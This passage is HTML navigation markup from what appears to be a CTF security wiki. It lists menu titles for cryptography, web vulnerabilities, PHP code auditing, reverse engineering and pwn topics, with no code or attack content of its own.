    <a href="../../../crypto/asymmetric/rsa/rsa_d_attack-zh/" title="Private key d Related attacks" class="md-nav__link">
      Private key d Related attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/asymmetric/rsa/rsa_coppersmith_attack-zh/" title="Coppersmith related attacks" class="md-nav__link">
      Coppersmith related attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/asymmetric/rsa/rsa_chosen_plain_cipher-zh/" title="Select a clear ciphertext attack" class="md-nav__link">
      Select a clear ciphertext attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/asymmetric/rsa/rsa_side_channel-zh/" title="Side channel attack" class="md-nav__link">
      Side channel attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/asymmetric/rsa/rsa_pkcs_attack-zh/" title="Bleichenbacher attack" class="md-nav__link">
      Bleichenbacher attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/asymmetric/rsa/rsa_complex-zh/" title="Synthesis" class="md-nav__link">
      Synthesis
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/asymmetric/knapsack/knapsack-zh/" title="Knapsack encryption" class="md-nav__link">
      Knapsack encryption
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5-8-4" type="checkbox" id="nav-3-5-8-4">
    
    <label class="md-nav__link" for="nav-3-5-8-4">
      Discrete log correlation
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-3-5-8-4">
        Discrete log correlation
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/asymmetric/discrete-log/discrete-log-zh/" title="Discrete logarithm" class="md-nav__link">
      Discrete logarithm
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/asymmetric/discrete-log/elgamal-zh/" title="Elgamal" class="md-nav__link">
      Elgamal
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/asymmetric/discrete-log/ecc-zh/" title="ECC" class="md-nav__link">
      ECC
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5-8-5" type="checkbox" id="nav-3-5-8-5">
    
    <label class="md-nav__link" for="nav-3-5-8-5">
      Password
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-3-5-8-5">
        Password
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/asymmetric/lattice/overview-zh/" title="Lattice overview" class="md-nav__link">
      Lattice overview
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/asymmetric/lattice/introduction-zh/" title="Introduction to Lattices" class="md-nav__link">
      Introduction to Lattices
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/asymmetric/lattice/lattice-reduction-zh/" title="Lattice-based algorithm" class="md-nav__link">
      Lattice-based algorithm
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto / asymmetric / lattice / cvp-zh.md" title="CVP" class="md-nav__link">
      CVP
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5-9" type="checkbox" id="nav-3-5-9">
    
    <label class="md-nav__link" for="nav-3-5-9">
      Hash function
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-5-9">
        Hash function
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/hash/introduction-zh/" title="Introduction to the hash function" class="md-nav__link">
      Introduction to the hash function
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/hash/md5-zh/" title="MD5" class="md-nav__link">
      MD5
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/hash/sha1-zh/" title="SHA1" class="md-nav__link">
      SHA1
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/hash/fnv-zh/" title="FNV" class="md-nav__link">
      FNV
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/hash/attack-zh/" title="Hash Attack" class="md-nav__link">
      Hash Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/hash/complex-zh/" title="Synthesis" class="md-nav__link">
      Synthesis
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5-10" type="checkbox" id="nav-3-5-10">
    
    <label class="md-nav__link" for="nav-3-5-10">
      digital signature
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-5-10">
        digital signature
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/signature/introduction-zh/" title="Introduction to digital signatures" class="md-nav__link">
      Introduction to digital signatures
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/signature/rsa-zh/" title="RSA digital signature" class="md-nav__link">
      RSA digital signature
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/signature/elgamal-zh/" title="ElGamal digital signature" class="md-nav__link">
      ElGamal digital signature
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/signature/dsa-zh/" title="DSA digital signature" class="md-nav__link">
      DSA digital signature
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5-11" type="checkbox" id="nav-3-5-11">
    
    <label class="md-nav__link" for="nav-3-5-11">
      Summary of attack ideas
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-5-11">
        Summary of attack ideas
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/attack-summary/attack-mode-zh/" title="Introduction" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/attack-summary/meet-in-the-middle-zh/" title="Intermediate encounter attack" class="md-nav__link">
      Intermediate encounter attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/attack-summary/bit-attack-zh/" title="Bit attack" class="md-nav__link">
      Bit attack
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/certificate/introduction-zh/" title="Certificate format" class="md-nav__link">
      Certificate format
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" checked>
    
    <label class="md-nav__link" for="nav-4">
      Web
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-4">
        Web
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../introduction-zh/" title="Introduction to Web Applications" class="md-nav__link">
      Introduction to Web Applications
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../sqli-zh/" title="SQL injection" class="md-nav__link">
      SQL injection
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../xss-zh/" title="XSS cross-site scripting attack" class="md-nav__link">
      XSS cross-site scripting attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../csrf-zh/" title="CSRF cross-site request forgery" class="md-nav__link">
      CSRF cross-site request forgery
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../ssrf-zh/" title="SSRF server request forgery" class="md-nav__link">
      SSRF server request forgery
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        PHP code auditing
      </label>
    
    <a href="./" title="PHP code auditing" class="md-nav__link md-nav__link--active">
      PHP code auditing
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">目录</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" title="文件包含" class="md-nav__link">
    文件包含
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_2" title="本地文件包含" class="md-nav__link">
    本地文件包含
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_3" title="远程文件包含" class="md-nav__link">
    远程文件包含
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_4" title="文件上传" class="md-nav__link">
    文件上传
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_5" title="绕过上传检查" class="md-nav__link">
    绕过上传检查
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_6" title="变量覆盖" class="md-nav__link">
    变量覆盖
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_7" title="全局变量覆盖" class="md-nav__link">
    全局变量覆盖
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#extract" title="extract() 变量覆盖" class="md-nav__link">
    extract() 变量覆盖
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#import_request_variables" title="import_request_variables 变量覆盖" class="md-nav__link">
    import_request_variables 变量覆盖
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#parse_str" title="parse_str() 变量覆盖" class="md-nav__link">
    parse_str() 变量覆盖
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_8" title="命令执行" class="md-nav__link">
    命令执行
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_9" title="直接执行代码" class="md-nav__link">
    直接执行代码
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#preg_replace" title="preg_replace() 代码执行" class="md-nav__link">
    preg_replace() 代码执行
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#preg_match" title="preg_match 代码执行" class="md-nav__link">
    preg_match 代码执行
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_get" title="构造 _GET 读取" class="md-nav__link">
    构造 _GET 读取
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_get_1" title="获取 _GET 参数" class="md-nav__link">
    获取 _GET 参数
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_10" title="传入参数" class="md-nav__link">
    传入参数
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_11" title="动态函数执行" class="md-nav__link">
    动态函数执行
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_12" title="反引号命令执行" class="md-nav__link">
    反引号命令执行
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#curly-syntax" title="Curly Syntax" class="md-nav__link">
    Curly Syntax
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_13" title="回调函数" class="md-nav__link">
    回调函数
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_14" title="反序列化" class="md-nav__link">
    反序列化
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#php" title="PHP 特性" class="md-nav__link">
    PHP 特性
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_15" title="数组" class="md-nav__link">
    数组
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hash" title="魔法 Hash" class="md-nav__link">
    魔法 Hash
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_16" title="十六进制转换" class="md-nav__link">
    十六进制转换
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_17" title="类型转换" class="md-nav__link">
    类型转换
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_18" title="内置函数的参数的松散性" class="md-nav__link">
    内置函数的参数的松散性
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_19" title="寻找源代码备份" class="md-nav__link">
    寻找源代码备份
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#hg" title="hg 源码泄露" class="md-nav__link">
    hg 源码泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#git" title="Git 源码泄露" class="md-nav__link">
    Git 源码泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ds_store" title=".DS_Store 文件泄露" class="md-nav__link">
    .DS_Store 文件泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_20" title="网站备份文件" class="md-nav__link">
    网站备份文件
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#svn" title="SVN 泄露" class="md-nav__link">
    SVN 泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-inf-webxml" title="WEB-INF / web.xml 泄露" class="md-nav__link">
    WEB-INF / web.xml 泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cvs" title="CVS 泄露" class="md-nav__link">
    CVS 泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_21" title="参考文献" class="md-nav__link">
    参考文献
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
        <li class="md-nav__item">
          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
            评论
          </a>
        </li>
      
    </ul>
  
</nav>
    
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
    
    <label class="md-nav__link" for="nav-5">
      Assembly
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-5">
        Assembly
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../assembly/x86-x64/readme-zh/" title="x86_x64" class="md-nav__link">
      x86_x64
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../assembly/mips/readme-zh/" title="mips" class="md-nav__link">
      mips
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../assembly/arm/readme-zh/" title="arm" class="md-nav__link">
      arm
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
    
    <label class="md-nav__link" for="nav-6">
      Executable
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-6">
        Executable
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-1" type="checkbox" id="nav-6-1">
    
    <label class="md-nav__link" for="nav-6-1">
      ELF file
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-6-1">
        ELF file
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../executable/elf/elf-structure-zh/" title="ELF file basic structure" class="md-nav__link">
      ELF file basic structure
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../executable/elf/program-loading-zh/" title="Program loading" class="md-nav__link">
      Program loading
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../executable/elf/program-linking-zh/" title="Program link" class="md-nav__link">
      Program link
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../executable/elf/running-overview-zh/" title="Program execution flow" class="md-nav__link">
      Program execution flow
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
    
    <label class="md-nav__link" for="nav-7">
      Reverse
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-7">
        Reverse
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-1" type="checkbox" id="nav-7-1">
    
    <label class="md-nav__link" for="nav-7-1">
      Reverse Overview
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-7-1">
        Reverse Overview
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/introduction-zh/" title="Software Reverse Engineering Introduction" class="md-nav__link">
      Software Reverse Engineering Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/Identify-Encode-Encryption/introduction-zh/" title="Common encryption algorithms and code recognition" class="md-nav__link">
      Common encryption algorithms and code recognition
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/maze/maze-zh/" title="Labyrinth problem" class="md-nav__link">
      Labyrinth problem
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/vm/vm-zh/" title="Virtual machine command analysis" class="md-nav__link">
      Virtual machine command analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/unicorn/introduction-zh/" title="Unicorn Engine 简介" class="md-nav__link">
      Unicorn Engine 简介
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-2" type="checkbox" id="nav-7-2">
    
    <label class="md-nav__link" for="nav-7-2">
      Linux Reverse
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-7-2">
        Linux Reverse
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-2-1" type="checkbox" id="nav-7-2-1">
    
    <label class="md-nav__link" for="nav-7-2-1">
      Linux Reverse Technology
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-7-2-1">
        Linux Reverse Technology
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/linux/ld_preload-zh/" title="LD_PRELOAD" class="md-nav__link">
      LD_PRELOAD
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/linux/false-disasm-zh/" title="False Disassembly" class="md-nav__link">
      False Disassembly
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/linux/detect-bp-zh/" title="Detecting Breakpoints" class="md-nav__link">
      Detecting Breakpoints
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/linux/detect-dbg-zh/" title="Detecting debugging" class="md-nav__link">
      Detecting debugging
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-3" type="checkbox" id="nav-7-3">
    
    <label class="md-nav__link" for="nav-7-3">
      Windows Reverse
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-7-3">
        Windows Reverse
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-3-1" type="checkbox" id="nav-7-3-1">
    
    <label class="md-nav__link" for="nav-7-3-1">
      Shelling technology
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-7-3-1">
        Shelling technology
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/windows/unpack/packer-introduction-zh/" title="Introduction to the protective case" class="md-nav__link">
      Introduction to the protective case
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/windows/unpack/trace-zh/" title="Single step tracking method" class="md-nav__link">
      Single step tracking method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/windows/unpack/esp-zh/" title="ESP law" class="md-nav__link">
      ESP law
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/windows/unpack/direct-oep-zh/" title="One step to the OEP method" class="md-nav__link">
      One step to the OEP method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/windows/unpack/memory-zh/" title="Memory mirroring method" class="md-nav__link">
      Memory mirroring method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/windows/unpack/last-exception-zh/" title="Last exception method" class="md-nav__link">
      Last exception method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/windows/unpack/sfx-zh/" title="SFX method" class="md-nav__link">
      SFX method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/windows/unpack/fix-iat-zh/" title="DUMP and IAT reconstruction" class="md-nav__link">
      DUMP and IAT reconstruction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/windows/unpack/manually-fix-iat-zh/" title="Manually find the IAT and rebuild it using ImportREC" class="md-nav__link">
      Manually find the IAT and rebuild it using ImportREC
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/windows/unpack/unpack-dll-zh/" title="DLL file unpacking" class="md-nav__link">
      DLL file unpacking
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-3-2" type="checkbox" id="nav-7-3-2">
    
    <label class="md-nav__link" for="nav-7-3-2">
      Anti-debugging technology
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-7-3-2">
        Anti-debugging technology
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/windows/anti-debug/ntglobalflag-zh/" title="NtGlobalFlag" class="md-nav__link">
      NtGlobalFlag
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/windows/anti-debug/heap-flags-zh/" title="Heap Flags" class="md-nav__link">
      Heap Flags
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/windows/anti-debug/the-heap-zh/" title="The Heap" class="md-nav__link">
      The Heap
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/windows/anti-debug/int-3-zh/" title="Interrupt 3" class="md-nav__link">
      Interrupt 3
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/windows/anti-debug/isdebuggerpresent-zh/" title="IsDebuggerPresent" class="md-nav__link">
      IsDebuggerPresent
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/windows/anti-debug/checkremotedebuggerpresent-zh/" title="CheckRemoteDebuggerPresent" class="md-nav__link">
      CheckRemoteDebuggerPresent
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/windows/anti-debug/ntqueryinformationprocess-zh/" title="NtQueryInformationProcess" class="md-nav__link">
      NtQueryInformationProcess
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/windows/anti-debug/junk-code-zh/" title="Flower command" class="md-nav__link">
      Flower command
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../reverse/windows/anti-debug/example-zh/" title="Anti-debug technical example" class="md-nav__link">
      Anti-debug technical example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8" type="checkbox" id="nav-8">
    
    <label class="md-nav__link" for="nav-8">
      Pwn
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-8">
        Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-1" type="checkbox" id="nav-8-1">
    
    <label class="md-nav__link" for="nav-8-1">
      Pwn Overview
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-8-1">
        Pwn Overview
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/readme-zh/" title="Readme zh" class="md-nav__link">
      Readme zh
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2" type="checkbox" id="nav-8-2">
    
    <label class="md-nav__link" for="nav-8-2">
      Linux Pwn
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-8-2">
        Linux Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-1" type="checkbox" id="nav-8-2-1">
    
    <label class="md-nav__link" for="nav-8-2-1">
      Security protection mechanism
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-1">
        Security protection mechanism
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/mitigation/canary-zh/" title="canary" class="md-nav__link">
      canary
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-2" type="checkbox" id="nav-8-2-2">
    
    <label class="md-nav__link" for="nav-8-2-2">
      Stack overflow
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-2">
        Stack overflow
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/stackoverflow/stack-intro-zh/" title="Stack introduction" class="md-nav__link">
      Stack introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/stackoverflow/stackoverflow-basic-zh/" title="Stack overflow principle" class="md-nav__link">
      Stack overflow principle
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/stackoverflow/basic-rop-zh/" title="Basic ROP" class="md-nav__link">
      Basic ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/stackoverflow/medium-rop-zh/" title="Intermediate ROP" class="md-nav__link">
      Intermediate ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/stackoverflow/advanced-rop-zh/" title="Advanced ROP" class="md-nav__link">
      Advanced ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/stackoverflow/fancy-rop-zh/" title="Fancy stack overflow" class="md-nav__link">
      Fancy stack overflow
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-3" type="checkbox" id="nav-8-2-3">
    
    <label class="md-nav__link" for="nav-8-2-3">
      Format string vulnerability
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-3">
        Format string vulnerability
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
